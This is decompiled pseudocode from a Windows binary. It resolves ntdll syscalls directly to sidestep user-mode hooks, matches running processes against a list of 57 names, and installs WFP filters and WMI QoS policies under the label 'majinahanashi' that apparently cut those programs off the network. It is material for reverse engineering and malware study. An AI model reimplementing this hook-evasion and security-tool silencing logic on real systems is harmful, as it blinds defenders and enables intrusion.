          *v44++ = v57[v43-- + 48];
        while ( v43 != 0 );
        *(_WORD *)&v56[(int)v45] = 2573;
        v56[(int)v45 + 2] = 0;
        qword_140018880(v41, &v56[2], v45, &v59, 0);
        for ( n = 0; n < 546; n += 3LL )
        {
          if ( *(_QWORD *)off_140010510[n + 2] == 0 )
          {
            v47 = off_140010510[n];
            v48 = 0;
            v49 = 0;
            v50 = *v47;
            if ( *v47 != 0 )
            {
              v51 = (char *)v58 - v47;
              do
              {
                (v47++)[v51] = v50;
                v50 = *v47;
                ++v48;
                ++v49;
              }
              while ( *v47 != 0 );
            }
            v52 = off_140010510[n + 1];
            v53 = v48 + 1;
            *((_BYTE *)v58 + v49) = 58;
            v54 = v49 + 1;
            for ( ii = *v52; *v52 != 0; ++v54 )
            {
              *((_BYTE *)v58 + v54) = ii;
              ii = *++v52;
              ++v53;
            }
            *(_WORD *)((char *)v58 + v54) = 2573;
            *((_BYTE *)&v58[1] + v54) = 0;
            qword_140018880(v42, v58, (unsigned int)(v53 + 2), &v59, 0);
          }
        }
      }
    }
  }
  dword_140018BF0 = 1;
  return 1;
}


// ----- sub_14000A7E0 @ 0x14000a7e0 -----
__int64 __fastcall sub_14000A7E0(unsigned __int8 *a1, __int64 a2, unsigned __int64 a3)
{
  unsigned __int8 *v5; // rax
  __int64 v6; // rdx
  int v7; // r8d
  int v8; // ecx

  if ( a3 == 0 )
    return 0;
  v5 = a1;
  v6 = a2 - (_QWORD)a1;
  while ( 1 )
  {
    v7 = *v5;
    v8 = v5[v6];
    if ( (_BYTE)v7 != (_BYTE)v8 )
      break;
    if ( ++v5 - a1 >= a3 )
      return 0;
  }
  return (unsigned int)(v7 - v8);
}


// ----- sub_14000A820 @ 0x14000a820 -----
void *__fastcall sub_14000A820(void *a1, const void *a2, unsigned __int64 a3)
{
  qmemcpy(a1, a2, a3);
  return a1;
}


// ----- sub_14000A850 @ 0x14000a850 -----
void *__fastcall sub_14000A850(void *a1, char a2, unsigned __int64 a3)
{
  memset(a1, a2, a3);
  return a1;
}


// ----- sub_14000A870 @ 0x14000a870 -----
__int64 __fastcall sub_14000A870(__int64 a1, _BYTE *a2)
{
  __int64 v4; // rax
  __int64 v5; // r8
  __int64 v6; // r9
  __int64 v7; // rsi
  unsigned int *v8; // r10
  unsigned int v9; // ebx
  __int64 v10; // rbp
  _BYTE *v11; // rdx
  char *v12; // rax
  char i; // cl

  if ( *(_WORD *)a1 != 23117 )
    return 0;
  v4 = *(unsigned int *)(a1 + 60);
  if ( *(_DWORD *)(v4 + a1) != 17744 )
    return 0;
  v5 = *(unsigned int *)(v4 + a1 + 136);
  if ( (_DWORD)v5 == 0 )
    return 0;
  v6 = 0;
  v7 = a1 + *(unsigned int *)(v5 + a1 + 28);
  v8 = (unsigned int *)(a1 + *(unsigned int *)(v5 + a1 + 32));
  v9 = *(_DWORD *)(v5 + a1 + 24);
  v10 = a1 + *(unsigned int *)(v5 + a1 + 36);
  if ( v9 == 0 )
    return 0;
  while ( 1 )
  {
    v11 = a2;
    v12 = (char *)(a1 + *v8);
    for ( i = *v12; i != 0; ++v11 )
    {
      if ( *v11 == 0 )
        break;
      if ( i != *v11 )
        goto LABEL_10;
      i = *++v12;
    }
    if ( *v12 == *v11 )
      return a1 + *(unsigned int *)(v7 + 4LL * *(unsigned __int16 *)(v10 + 2 * v6));
LABEL_10:
    v6 = (unsigned int)(v6 + 1);
    ++v8;
    if ( (unsigned int)v6 >= v9 )
      return 0;
  }
}


// ----- sub_14000A940 @ 0x14000a940 -----
__int64 __fastcall sub_14000A940(__int64 a1)
{
  int v1; // edx
  _BYTE *v2; // rax

  v1 = 0;
  v2 = (_BYTE *)(a1 + 2);
  while ( *(v2 - 2) != 15 || *(v2 - 1) != 5 || *v2 != 0xC3 )
  {
    ++v2;
    ++v1;
    if ( (__int64)&v2[-2 - a1] >= 128 )
      return 0;
  }
  return a1 + v1;
}


// ----- sub_14000A980 @ 0x14000a980 -----
_BOOL8 sub_14000A980()
{
  return (int)sub_14000ADCC() >= 0;
}


// ----- sub_14000A9A0 @ 0x14000a9a0 -----
__int64 __fastcall sub_14000A9A0(__int64 a1, __int64 a2, int a3, _DWORD *a4)
{
  __int64 v6; // [rsp+50h] [rbp-18h] BYREF
  __int64 v7; // [rsp+58h] [rbp-10h]

  v6 = 0;
  v7 = 0;
  if ( (int)sub_14000ADA8(a1, 0, 0, 0, &v6, a2, a3, 0, 0) < 0 )
    return 0;
  if ( a4 != nullptr )
    *a4 = v7;
  return 1;
}


// ----- sub_14000AA00 @ 0x14000aa00 -----
__int64 __fastcall sub_14000AA00(__int64 a1, __int64 a2, int a3, _DWORD *a4)
{
  __int64 v6; // [rsp+50h] [rbp-18h] BYREF
  __int64 v7; // [rsp+58h] [rbp-10h]

  v6 = 0;
  v7 = 0;
  if ( (int)sub_14000ADBA(a1, 0, 0, 0, &v6, a2, a3, 0, 0) < 0 )
    return 0;
  if ( a4 != nullptr )
    *a4 = v7;
  return 1;
}


// ----- sub_14000AA60 @ 0x14000aa60 -----
__int64 __fastcall sub_14000AA60(unsigned __int64 a1, __int64 a2)
{
  __int64 v2; // r9
  int v4; // r10d
  int v5; // r8d
  __int64 v6; // rdx
  _BYTE *v7; // rax

  v2 = a2;
  if ( *(_BYTE *)a2 == 76 && *(_BYTE *)(a2 + 1) == 0x8B && *(_BYTE *)(a2 + 2) == 0xD1 )
    return *(unsigned __int8 *)(a2 + 4) | ((*(unsigned __int8 *)(a2 + 5) | (*(unsigned __int16 *)(a2 + 6) << 8)) << 8);
  v4 = 0;
  while ( 2 )
  {
    --v2;
    v5 = 0;
    v6 = 0;
    v7 = (_BYTE *)(v2 + 2);
    do
    {
      if ( v2 - v6 < a1 )
        break;
      if ( *(v7 - 2) == 76 && *(v7 - 1) == 0x8B && *v7 == 0xD1 )
        return (*(unsigned __int8 *)(v2 - v5 + 4)
              | ((*(unsigned __int8 *)(v2 - v5 + 5) | (*(unsigned __int16 *)(v2 - v5 + 6) << 8)) << 8))
             + 1;
      ++v5;
      ++v6;
      --v7;
    }
    while ( v6 < 8 );
    if ( ++v4 < 2048 )
      continue;
    break;
  }
  return 0xFFFFFFFFLL;
}


// ----- sub_14000AB20 @ 0x14000ab20 -----
_BOOL8 __fastcall sub_14000AB20(__int64 a1, unsigned int a2)
{
  _QWORD v3[2]; // [rsp+20h] [rbp-48h] BYREF
  int v4; // [rsp+30h] [rbp-38h] BYREF
  __int128 v5; // [rsp+38h] [rbp-30h]
  int v6; // [rsp+48h] [rbp-20h]
  __int128 v7; // [rsp+50h] [rbp-18h]

  v3[0] = a2;
  v3[1] = 0;
  v4 = 48;
  v6 = 64;
  v5 = 0;
  v7 = 0;
  return (int)((__int64 (__fastcall *)(__int64, __int64, int *, _QWORD *))sub_14000ADF0)(a1, 4096, &v4, v3) >= 0;
}


// ----- sub_14000AB80 @ 0x14000ab80 -----
_BOOL8 __fastcall sub_14000AB80(__int64 a1, unsigned int a2, __int64 a3)
{
  return (int)sub_14000ADDE(5, a1, a2, a3) >= 0;
}


// ----- sub_14000ABB0 @ 0x14000abb0 -----
__int64 __fastcall sub_14000ABB0(unsigned __int64 a1)
{
  __int64 v3; // rdi
  __int64 v4; // rsi
  __int64 v5; // rbp
  __int64 v6; // rax
  __int64 v7; // rdi
  __int64 v8; // rax
  __int64 v9; // rdi
  __int64 v10; // rax
  __int64 v11; // rdi

  if ( a1 == 0 )
    return 0xFFFFFFFFLL;
  v3 = sub_14000A870(a1, "NtReadFile");
  if ( v3 == 0 )
    return 4294967294LL;
  v4 = sub_14000A870(a1, "NtWriteFile");
  if ( v4 == 0 )
    return 4294967293LL;
  v5 = sub_14000A870(a1, "NtClose");
  if ( v5 == 0 )
    return 4294967292LL;
  dword_140017630 = sub_14000AA60(a1, v3);
  if ( dword_140017630 < 0 )
    return 4294967291LL;
  dword_140017634 = sub_14000AA60(a1, v4);
  if ( dword_140017634 < 0 )
    return 4294967290LL;
  dword_140017638 = sub_14000AA60(a1, v5);
  if ( dword_140017638 < 0 )
    return 4294967289LL;
  qword_140017640 = sub_14000A940(v3);
  qword_140017648 = sub_14000A940(v4);
  qword_140017650 = sub_14000A940(v5);
  v6 = sub_14000A870(a1, "NtQuerySystemInformation");
  v7 = v6;
  if ( v6 != 0 )
  {
    dword_140018E68 = sub_14000AA60(a1, v6);
    qword_140018E58 = sub_14000A940(v7);
  }
  v8 = sub_14000A870(a1, "NtOpenProcess");
  v9 = v8;
  if ( v8 != 0 )
  {
    dword_140018E64 = sub_14000AA60(a1, v8);
    qword_140018E50 = sub_14000A940(v9);
  }
  v10 = sub_14000A870(a1, "NtQueryInformationProcess");
  v11 = v10;
  if ( v10 != 0 )
  {
    dword_140018E60 = sub_14000AA60(a1, v10);
    qword_140018E48 = sub_14000A940(v11);
  }
  return 0;
}


// ----- sub_14000ADA8 @ 0x14000ada8 -----
__int64 sub_14000ADA8()
{
  __int64 result; // rax

  result = (unsigned int)dword_140017630;
  if ( qword_140017640 != nullptr && *(_BYTE *)qword_140017640 == 15 && *((_BYTE *)qword_140017640 + 1) == 5 )
    return qword_140017640();
  __asm { syscall; Low latency system call }
  return result;
}


// ----- sub_14000ADBA @ 0x14000adba -----
__int64 sub_14000ADBA()
{
  __int64 result; // rax

  result = (unsigned int)dword_140017634;
  if ( qword_140017648 != nullptr && *(_BYTE *)qword_140017648 == 15 && *((_BYTE *)qword_140017648 + 1) == 5 )
    return qword_140017648();
  __asm { syscall; Low latency system call }
  return result;
}


// ----- sub_14000ADCC @ 0x14000adcc -----
__int64 sub_14000ADCC()
{
  __int64 result; // rax

  result = (unsigned int)dword_140017638;
  if ( qword_140017650 != nullptr && *(_BYTE *)qword_140017650 == 15 && *((_BYTE *)qword_140017650 + 1) == 5 )
    return qword_140017650();
  __asm { syscall; Low latency system call }
  return result;
}


// ----- sub_14000ADDE @ 0x14000adde -----
__int64 sub_14000ADDE()
{
  __int64 result; // rax

  result = (unsigned int)dword_140018E68;
  if ( qword_140018E58 != nullptr && *(_BYTE *)qword_140018E58 == 15 && *((_BYTE *)qword_140018E58 + 1) == 5 )
    return qword_140018E58();
  __asm { syscall; Low latency system call }
  return result;
}


// ----- sub_14000ADF0 @ 0x14000adf0 -----
__int64 sub_14000ADF0()
{
  __int64 result; // rax

  result = (unsigned int)dword_140018E64;
  if ( qword_140018E50 != nullptr && *(_BYTE *)qword_140018E50 == 15 && *((_BYTE *)qword_140018E50 + 1) == 5 )
    return qword_140018E50();
  __asm { syscall; Low latency system call }
  return result;
}


// ----- sub_14000AE20 @ 0x14000ae20 -----
__int64 sub_14000AE20()
{
  return 0;
}


// ----- sub_14000AE30 @ 0x14000ae30 -----
__int64 sub_14000AE30()
{
  int v0; // ebp
  __int64 v1; // rdx
  __int64 v2; // rcx
  __int64 (__fastcall *v4)(__int64, __int64, __int64); // rbx
  __int64 v5; // rax
  __int64 v6; // rax
  unsigned int *v7; // r15
  __int64 v8; // rdx
  __int64 v9; // rcx
  void (__fastcall *v10)(__int64, _QWORD, unsigned int *); // rbx
  __int64 v11; // rax
  unsigned int *v12; // rsi
  int v13; // r14d
  const void *v14; // rdx
  unsigned int v15; // eax
  __int64 v16; // rax
  __int64 v17; // rbx
  LPCWSTR *v18; // rdi
  unsigned int v19; // ebx
  unsigned int v20; // edx
  __int64 v21; // rbx
  __int64 v22; // rax
  void (__fastcall *v23)(__int64, _QWORD, unsigned int *); // rbx
  __int64 v24; // rax
  WCHAR String1[256]; // [rsp+30h] [rbp-458h] BYREF
  _BYTE v26[536]; // [rsp+230h] [rbp-258h] BYREF
  int v27; // [rsp+490h] [rbp+8h] BYREF
  int v28; // [rsp+498h] [rbp+10h] BYREF
  __int64 v29; // [rsp+4A0h] [rbp+18h] BYREF
  __int64 v30; // [rsp+4A8h] [rbp+20h] BYREF

  v0 = 0;
  v29 = 0;
  if ( (unsigned int)qword_140018B58(0, 0xFFFFFFFFLL, 0, 0, &v29) != 0 )
    return 0xFFFFFFFFLL;
  v4 = (__int64 (__fastcall *)(__int64, __int64, __int64))qword_140018768;
  v5 = qword_140018740(v2, v1);
  v6 = v4(v5, 8, 0x100000);
  v7 = (unsigned int *)v6;
  if ( v6 == 0 )
    goto LABEL_6;
  v27 = 0;
  if ( !sub_14000AB80(v6, 0x100000u, (__int64)&v27) )
  {
    v10 = (void (__fastcall *)(__int64, _QWORD, unsigned int *))qword_140018770;
    v11 = qword_140018740(v9, v8);
    v10(v11, 0, v7);
LABEL_6:
    qword_140018B60(v29);
    return 0xFFFFFFFFLL;
  }
  v12 = v7;
  v13 = 0;
  while ( 1 )
  {
    v14 = *((const void **)v12 + 8);
    if ( v14 != nullptr )
    {
      v15 = *((unsigned __int16 *)v12 + 28);
      if ( (_WORD)v15 != 0 )
      {
        v16 = v15 >> 1;
        if ( (unsigned int)v16 > 0xFF )
          v16 = 255;
        v17 = v16;
        sub_14000A820(String1, v14, 2 * v16);
        String1[v17] = 0;
        v18 = (LPCWSTR *)off_140017030;
        v19 = 0;
        while ( lstrcmpiW(String1, *v18) != 0 )
        {
          ++v19;
          ++v18;
          if ( v19 >= 0x39 )
            goto LABEL_20;
        }
        v20 = v12[20];
        v30 = 0;
        sub_14000AB20((__int64)&v30, v20);
        v21 = v30;
        if ( v30 != 0 )
        {
          sub_14000A850(v26, 0, 0x208u);
          v28 = 260;
          if ( (unsigned int)qword_140018BE0(v21, 0, v26, &v28) != 0 )
          {
            sub_14000B0A0(v29, v26);
            ++v13;
          }
          qword_140018640(v30);
        }
      }
    }
LABEL_20:
    v22 = *v12;
    if ( (_DWORD)v22 == 0 )
      break;
    v12 = (unsigned int *)((char *)v12 + v22);
  }
  v23 = (void (__fastcall *)(__int64, _QWORD, unsigned int *))qword_140018770;
  v24 = qword_140018740(v9, v14);
  v23(v24, 0, v7);
  qword_140018B60(v29);
  LOBYTE(v0) = v13 > 0;
  return (unsigned int)(v0 - 1);
}


// ----- sub_14000B0A0 @ 0x14000b0a0 -----
__int64 __fastcall sub_14000B0A0(__int64 a1, unsigned __int16 *a2)
{
  __int64 result; // rax
  __int64 v5; // rbx
  __int64 v6; // rsi
  __int16 v7; // ax
  _WORD *v8; // rdx
  _BYTE v9[528]; // [rsp+20h] [rbp-628h] BYREF
  _WORD v10[524]; // [rsp+230h] [rbp-418h] BYREF
  __int16 v11; // [rsp+658h] [rbp+10h] BYREF
  int v12; // [rsp+65Ah] [rbp+12h]

  result = *a2;
  if ( *(_DWORD *)a2 != 6029404 )
  {
    v11 = *a2;
    v12 = 58;
    LODWORD(v5) = 0;
    result = qword_140018BE8(&v11, v9, 260);
    if ( (_DWORD)result != 0 )
    {
      v6 = (int)qword_1400187D0(v9);
      result = qword_1400187D0(a2 + 2);
      if ( (int)v6 + (int)result + 1 <= 520 )
      {
        qword_1400187B8(v10, v9);
        qword_1400187B8(&v10[v6], a2 + 2);
        v7 = v10[0];
        if ( v10[0] != 0 )
        {
          v8 = v10;
          do
          {
            if ( (unsigned __int16)(v7 - 65) <= 0x19u )
              *v8 = v7 + 32;
            v5 = (unsigned int)(v5 + 1);
            v7 = v10[v5];
            v8 = &v10[v5];
          }
          while ( v7 != 0 );
        }
        return sub_14000B1E0(a1, v10);
      }
    }
  }
  return result;
}


// ----- sub_14000B1E0 @ 0x14000b1e0 -----
__int64 __fastcall sub_14000B1E0(__int64 a1, const void *a2)
{
  int v4; // eax
  __int64 (__fastcall *v5)(__int64, _QWORD, __int64); // rbx
  unsigned int v6; // r15d
  __int64 v7; // rdx
  __int64 v8; // rcx
  __int64 v9; // rax
  __int64 result; // rax
  __int64 v11; // rdx
  __int64 v12; // rcx
  __int64 v13; // rsi
  __int64 (__fastcall *v14)(__int64, _QWORD, _QWORD); // rbx
  __int64 v15; // rax
  void *v16; // rax
  __int64 v17; // rdx
  __int64 v18; // rcx
  int v19; // eax
  __int64 v20; // r8
  unsigned int v21; // edx
  unsigned int v22; // ebx
  __int64 v23; // rdi
  const WCHAR *v24; // rcx
  unsigned int v25; // eax
  __int64 v26; // rdi
  void (__fastcall *v27)(__int64, _QWORD, __int64); // rbx
  __int64 v28; // rax
  __int64 (__fastcall *v29)(__int64, _QWORD, __int64); // rbx
  __int64 v30; // rax
  __int64 v31; // [rsp+30h] [rbp-D0h] BYREF
  unsigned __int64 v32; // [rsp+38h] [rbp-C8h] BYREF
  __int64 v33; // [rsp+40h] [rbp-C0h] BYREF
  _DWORD v34[5]; // [rsp+48h] [rbp-B8h] BYREF
  _DWORD v35[5]; // [rsp+5Ch] [rbp-A4h]
  int v36; // [rsp+70h] [rbp-90h] BYREF
  _BYTE v37[20]; // [rsp+74h] [rbp-8Ch]
  LPCWSTR lpString2_4; // [rsp+88h] [rbp-78h]
  int lpString2_12; // [rsp+90h] [rbp-70h]
  __int128 v40; // [rsp+94h] [rbp-6Ch]
  __int64 v41; // [rsp+A4h] [rbp-5Ch]
  int v42; // [rsp+ACh] [rbp-54h]
  int v43; // [rsp+B0h] [rbp-50h] BYREF
  _BYTE v44[12]; // [rsp+B4h] [rbp-4Ch] BYREF
  const wchar_t *v45; // [rsp+C0h] [rbp-40h]
  int v46; // [rsp+D0h] [rbp-30h]
  __int128 *v47; // [rsp+D8h] [rbp-28h]
  __int128 v48; // [rsp+F0h] [rbp-10h]
  int v49; // [rsp+110h] [rbp+10h]
  unsigned __int64 *v50; // [rsp+118h] [rbp+18h]
  int v51; // [rsp+120h] [rbp+20h]
  _DWORD *v52; // [rsp+128h] [rbp+28h]
  int v53; // [rsp+130h] [rbp+30h]
  unsigned int v54; // [rsp+1C0h] [rbp+C0h] BYREF
  __int64 v55; // [rsp+1C8h] [rbp+C8h] BYREF

  v4 = qword_1400187D0(a2);
  v5 = (__int64 (__fastcall *)(__int64, _QWORD, __int64))qword_140018768;
  v6 = 2 * v4 + 2;
  v9 = qword_140018740(v8, v7);
  result = v5(v9, 0, 16);
  v13 = result;
  if ( result != 0 )
  {
    v14 = (__int64 (__fastcall *)(__int64, _QWORD, _QWORD))qword_140018768;
    v15 = qword_140018740(v12, v11);
    v16 = (void *)v14(v15, 0, v6);
    *(_QWORD *)(v13 + 8) = v16;
    if ( v16 != nullptr )
    {
      sub_14000A820(v16, a2, v6);
      *(_DWORD *)v13 = v6;
      if ( dword_140018D10 != 0 )
        goto LABEL_19;
      v36 = 0;
      v41 = 0;
      v42 = 0;
      lpString2_12 = 1;
      *(_OWORD *)v37 = 0;
      *(_QWORD *)&v37[12] = L"majinahanashi WFP";
      lpString2_4 = L"majinahanashi WFP network control";
      v40 = 0;
      v19 = qword_140018B70(a1, &v36, 0);
      if ( v19 == -2144206839 || v19 == 0 )
      {
        v31 = 0;
        if ( (unsigned int)qword_140018B80(a1, 0, &v31) != 0 )
          goto LABEL_18;
        v55 = 0;
        v54 = 0;
        if ( (unsigned int)qword_140018B88(a1, v31, 100, &v55, &v54) != 0 )
          goto LABEL_17;
        v20 = v55;
        if ( v55 == 0 )
          goto LABEL_17;
        v21 = v54;
        v22 = 0;
        if ( v54 == 0 )
          goto LABEL_16;
        while ( 1 )
        {
          v23 = 8LL * v22;
          v24 = *(const WCHAR **)(*(_QWORD *)(v23 + v20) + 24LL);
          if ( v24 != nullptr )
          {
            if ( lstrcmpiW(v24, lpString2_4) == 0 )
            {
              dword_140018D10 = 1;
              xmmword_140018D00 = *(_OWORD *)*(_QWORD *)(v23 + v55);
LABEL_16:
              qword_140018B78(&v55);
LABEL_17:
              qword_140018B90(a1, v31);
LABEL_18:
              if ( dword_140018D10 != 0 )
              {
LABEL_19:
                v32 = 0xF000000000000000uLL;
                v25 = qword_140018758();
                v43 = 0;
                *(_OWORD *)v35 = 0;
                v34[4] = 0;
                v32 ^= v25 ^ 0xDEADBEEFLL | ((unsigned __int64)v25 << 32);
                v35[1] = 12;
                *(_OWORD *)v34 = xmmword_140012580;
                *(_QWORD *)&v35[3] = v13;
                sub_14000A850(v44, 0, 0xC4u);
                v46 = 1;
                v45 = L"majinahanashi Net Filter";
                v53 = 4097;
                v47 = &xmmword_140018D00;
                v49 = 4;
                v50 = &v32;
                v51 = 1;
                v52 = v34;
                v48 = xmmword_140012590;
                qword_140018B68(a1, &v43, 0, &v33);
                v48 = xmmword_1400125A0;
                qword_140018B68(a1, &v43, 0, &v33);
                v48 = xmmword_1400125B0;
                qword_140018B68(a1, &v43, 0, &v33);
                v48 = xmmword_1400125C0;
                qword_140018B68(a1, &v43, 0, &v33);
              }
              break;
            }
            v20 = v55;
            v21 = v54;
          }
          if ( ++v22 >= v21 )
            goto LABEL_16;
        }
      }
      v26 = *(_QWORD *)(v13 + 8);
      if ( v26 != 0 )
      {
        v27 = (void (__fastcall *)(__int64, _QWORD, __int64))qword_140018770;
        v28 = qword_140018740(v18, v17);
        v27(v28, 0, v26);
      }
    }
    v29 = (__int64 (__fastcall *)(__int64, _QWORD, __int64))qword_140018770;
    v30 = qword_140018740(v18, v17);
    return v29(v30, 0, v13);
  }
  return result;
}


// ----- sub_14000B570 @ 0x14000b570 -----
__int64 sub_14000B570()
{
  __int64 v0; // rdi
  void (__fastcall *v1)(__int64, const char *, _QWORD, char *, _QWORD); // rbx
  unsigned int v2; // eax
  char v4; // [rsp+40h] [rbp+8h] BYREF

  if ( dword_140018D20 != 0 )
    return 0;
  dword_140018D24 = (unsigned __int16)qword_140018758();
  if ( (unsigned int)sub_14000B800() == 0 )
  {
    dword_140018D20 = 1;
    v0 = qword_140018750(4294967284LL);
    if ( (unsigned __int64)(v0 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
    {
      v1 = (void (__fastcall *)(__int64, const char *, _QWORD, char *, _QWORD))qword_140018880;
      v2 = qword_1400187C8("[qos] init ok\r\n");
      v1(v0, "[qos] init ok\r\n", v2, &v4, 0);
    }
    return 0;
  }
  return 0xFFFFFFFFLL;
}


// ----- sub_14000B620 @ 0x14000b620 -----
__int64 sub_14000B620()
{
  unsigned __int64 i; // rbx

  for ( i = 0; i < 57; ++i )
    sub_14000BA60(off_140017220[i]);
  return 0;
}


// ----- sub_14000B660 @ 0x14000b660 -----
void sub_14000B660()
{
  if ( dword_140018D20 != 0 )
  {
    sub_14000C1B0();
    if ( pProxy != nullptr )
    {
      ((void (__fastcall *)(IUnknown *))pProxy->lpVtbl->Release)(pProxy);
      pProxy = nullptr;
    }
    CoUninitialize();
    dword_140018D20 = 0;
  }
}


// ----- sub_14000B6B0 @ 0x14000b6b0 -----
__int64 __fastcall sub_14000B6B0(__int64 a1)
{
  __int64 result; // rax
  __int64 v3; // rdi
  __int64 (__fastcall *v4)(__int64, __int64, _QWORD, char *, _QWORD); // rbx
  unsigned int v5; // eax
  char v6; // [rsp+48h] [rbp+10h] BYREF

  result = qword_140018750(4294967284LL);
  v3 = result;
  if ( (unsigned __int64)(result - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
  {
    v4 = (__int64 (__fastcall *)(__int64, __int64, _QWORD, char *, _QWORD))qword_140018880;
    v5 = qword_1400187C8(a1);
    return v4(v3, a1, v5, &v6, 0);
  }
  return result;
}


// ----- sub_14000B720 @ 0x14000b720 -----
LPVOID sub_14000B720()
{
  bool v0; // sf
  LPVOID result; // rax
  signed int v2; // eax
  __int64 v3; // rdi
  BSTR v4; // rax
  LONGLONG v5; // rbx
  VARIANTARG pvarg; // [rsp+30h] [rbp-28h] BYREF
  LPVOID ppv; // [rsp+60h] [rbp+8h] BYREF

  ppv = nullptr;
  v0 = CoCreateInstance(&rclsid, nullptr, 1u, &riid, &ppv) < 0;
  result = ppv;
  if ( !v0 && ppv != nullptr )
  {
    VariantInit(&pvarg);
    pvarg.vt = 8;
    v2 = qword_1400187D0(L"ActiveStore");
    v3 = v2;
    v4 = SysAllocStringLen(nullptr, v2);
    v5 = (LONGLONG)v4;
    if ( v4 != nullptr )
      sub_14000A820(v4, L"ActiveStore", 2 * v3);
    pvarg.llVal = v5;
    (*(void (__fastcall **)(LPVOID, const wchar_t *, _QWORD, VARIANTARG *))(*(_QWORD *)ppv + 64LL))(
      ppv,
      L"PolicyStore",
      0,
      &pvarg);
    VariantClear(&pvarg);
    return ppv;
  }
  return result;
}


// ----- sub_14000B800 @ 0x14000b800 -----
__int64 sub_14000B800()
{
  __int64 v0; // rdi
  void (__fastcall *v1)(__int64, const char *, _QWORD, char *, _QWORD); // rbx
  unsigned int v2; // eax
  HRESULT v4; // eax
  int v5; // ecx
  __int64 v6; // rdi
  void (__fastcall *v7)(__int64, const char *, _QWORD, char *, _QWORD); // rbx
  unsigned int v8; // eax
  __int64 (__fastcall *v9)(LPVOID, BSTR, _QWORD, _QWORD, _QWORD, _DWORD, _QWORD, _QWORD, IUnknown **); // rsi
  signed int v10; // eax
  __int64 v11; // rdi
  BSTR v12; // rax
  BSTR v13; // rbx
  int v14; // ebx
  char v15; // [rsp+70h] [rbp+8h] BYREF
  LPVOID ppv; // [rsp+78h] [rbp+10h] BYREF

  ppv = nullptr;
  if ( CoInitializeEx(nullptr, 0) >= 0 )
  {
    v4 = CoInitializeSecurity(nullptr, -1, nullptr, nullptr, 0, 3u, nullptr, 0, nullptr);
    v5 = 0;
    if ( v4 != -2147417831 )
      v5 = v4;
    if ( v5 >= 0 )
    {
      if ( CoCreateInstance(&stru_140015408, nullptr, 1u, &stru_1400153E8, &ppv) >= 0 )
      {
        v9 = *(__int64 (__fastcall **)(LPVOID, BSTR, _QWORD, _QWORD, _QWORD, _DWORD, _QWORD, _QWORD, IUnknown **))(*(_QWORD *)ppv + 24LL);
        v10 = qword_1400187D0(L"ROOT\\StandardCimv2");
        v11 = v10;
        v12 = SysAllocStringLen(nullptr, v10);
        v13 = v12;
        if ( v12 != nullptr )
          sub_14000A820(v12, L"ROOT\\StandardCimv2", 2 * v11);
        v14 = v9(ppv, v13, 0, 0, 0, 0, 0, 0, &pProxy);
        (*(void (__fastcall **)(LPVOID))(*(_QWORD *)ppv + 16LL))(ppv);
        if ( v14 >= 0 )
        {
          if ( CoSetProxyBlanket(pProxy, 0xFFFFFFFF, 0xFFFFFFFF, (OLECHAR *)0xFFFFFFFFFFFFFFFFLL, 0, 3u, nullptr, 0) >= 0 )
          {
            return 0;
          }
          else
          {
            sub_14000B6B0((__int64)"[qos] CoSetProxyBlanket FAIL\r\n");
            return 4294967291LL;
          }
        }
        else
        {
          sub_14000B6B0((__int64)"[qos] ConnectServer FAIL\r\n");
          return 4294967292LL;
        }
      }
      else
      {
        sub_14000B6B0((__int64)"[qos] CoCreateInstance FAIL\r\n");
        return 4294967293LL;
      }
    }
    else
    {
      v6 = qword_140018750(4294967284LL);
      if ( (unsigned __int64)(v6 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
      {
        v7 = (void (__fastcall *)(__int64, const char *, _QWORD, char *, _QWORD))qword_140018880;
        v8 = qword_1400187C8("[qos] CoInitializeSecurity FAIL\r\n");
        v7(v6, "[qos] CoInitializeSecurity FAIL\r\n", v8, &v15, 0);
      }
      return 4294967294LL;
    }
  }
  else
  {
    v0 = qword_140018750(4294967284LL);
    if ( (unsigned __int64)(v0 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
    {
      v1 = (void (__fastcall *)(__int64, const char *, _QWORD, char *, _QWORD))qword_140018880;
      v2 = qword_1400187C8("[qos] CoInitializeEx FAIL\r\n");
      v1(v0, "[qos] CoInitializeEx FAIL\r\n", v2, &v15, 0);
    }
    return 0xFFFFFFFFLL;
  }
}


// ----- sub_14000BA60 @ 0x14000ba60 -----
__int64 __fastcall sub_14000BA60(__int64 a1)
{
  HRESULT (__stdcall *QueryInterface)(IUnknown *, const IID *const, void **); // rsi
  signed int v3; // eax
  __int64 v4; // rdi
  BSTR v5; // rax
  BSTR v6; // rbx
  int v8; // ebx
  unsigned __int16 v9; // bx
  int v10; // eax
  int v11; // edx
  __int64 *v12; // rdi
  signed int v13; // eax
  __int64 v14; // rsi
  BSTR v15; // rax
  LONGLONG v16; // rbx
  __int64 v17; // rax
  __int64 *v18; // rsi
  signed int v19; // eax
  __int64 v20; // rdi
  BSTR v21; // rax
  LONGLONG v22; // rbx
  __int64 v23; // rax
  __int64 *v24; // rsi
  signed int v25; // eax
  __int64 v26; // rdi
  BSTR v27; // rax
  LONGLONG v28; // rbx
  __int64 v29; // rax
  __int64 *v30; // rsi
  signed int v31; // eax
  __int64 v32; // rdi
  BSTR v33; // rax
  LONGLONG v34; // rbx
  __int64 v35; // rax
  __int64 *v36; // rbx
  __int64 *v37; // rbx
  __int64 *v38; // rbx
  LPVOID v39; // rdi
  int v40; // ebx
  int v41; // r9d
  VARIANTARG *p_pguid; // rdx
  __int64 v43; // r8
  unsigned int v44; // ecx
  char v45; // al
  __int64 v46; // rax
  __int64 v47; // r8
  char v48; // dl
  __int64 v49; // rdi
  void (__fastcall *v50)(__int64, VARIANTARG *, _QWORD, int *, _QWORD); // rbx
  unsigned int v51; // eax
  __int64 v52; // [rsp+20h] [rbp-E0h]
  __int64 v53; // [rsp+28h] [rbp-D8h]
  VARIANTARG pguid; // [rsp+70h] [rbp-90h] BYREF
  WCHAR String2[64]; // [rsp+90h] [rbp-70h] BYREF
  WCHAR v56[40]; // [rsp+110h] [rbp+10h] BYREF
  WCHAR String1[256]; // [rsp+160h] [rbp+60h] BYREF
  _BYTE v58[528]; // [rsp+360h] [rbp+260h] BYREF
  int v59; // [rsp+5B8h] [rbp+4B8h] BYREF
  __int64 *v60; // [rsp+5C0h] [rbp+4C0h] BYREF
  __int64 v61; // [rsp+5C8h] [rbp+4C8h] BYREF

  if ( pProxy == nullptr || dword_140018D20 == 0 || (int)qword_1400187D8(65001, 0, a1, 0xFFFFFFFFLL, v58, 260) <= 0 )
    return 0xFFFFFFFFLL;
  v61 = 0;
